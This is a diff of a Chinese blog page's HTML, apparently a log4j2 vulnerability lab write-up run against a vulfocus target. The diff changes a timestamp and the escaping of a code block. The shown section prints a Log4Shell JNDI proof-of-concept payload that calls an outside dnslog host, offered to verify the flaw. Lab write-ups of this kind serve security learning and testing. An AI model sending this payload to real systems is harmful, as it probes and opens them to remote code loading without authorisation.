@@ -28,7 +28,7 @@
 <meta property="og:image" content="https://echozt.github.io/posts/f6c8/3.png">
 <meta property="og:image" content="https://echozt.github.io/posts/f6c8/4.png">
 <meta property="article:published_time" content="2022-10-12T08:36:04.000Z">
-<meta property="article:modified_time" content="2022-10-24T02:05:57.765Z">
+<meta property="article:modified_time" content="2022-10-24T02:16:02.698Z">
 <meta property="article:author" content="echozt">
 <meta property="article:tag" content="框架漏洞">
 <meta property="article:tag" content="log4j2">
@@ -250,7 +250,7 @@
 <h1 id="二、验证漏洞是否存在"><a href="#二、验证漏洞是否存在" class="headerlink" title="二、验证漏洞是否存在"></a>二、验证漏洞是否存在</h1><p>    这里我使用的是vulfocus平台上面的一个log4j2的靶场</p>
 <h3 id="方法一：dnslog验证"><a href="#方法一：dnslog验证" class="headerlink" title="方法一：dnslog验证"></a>方法一：dnslog验证</h3><p>1、先通过dnslog获得一个域名</p>
 <p>    构造poc：</p>
-<pre class="line-numbers language-http"><code class="language-http">$&amp;#123;jndi:ldap://o8ll0b.dnslog.cn&amp;#125;
+<pre class="line-numbers language-p"><code class="language-p">$&#123;jndi:ldap://o8ll0b.dnslog.cn&#125;
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>2、用url方式提交payload参数</p>
 <p>    构造payload：换成url形式：</p>
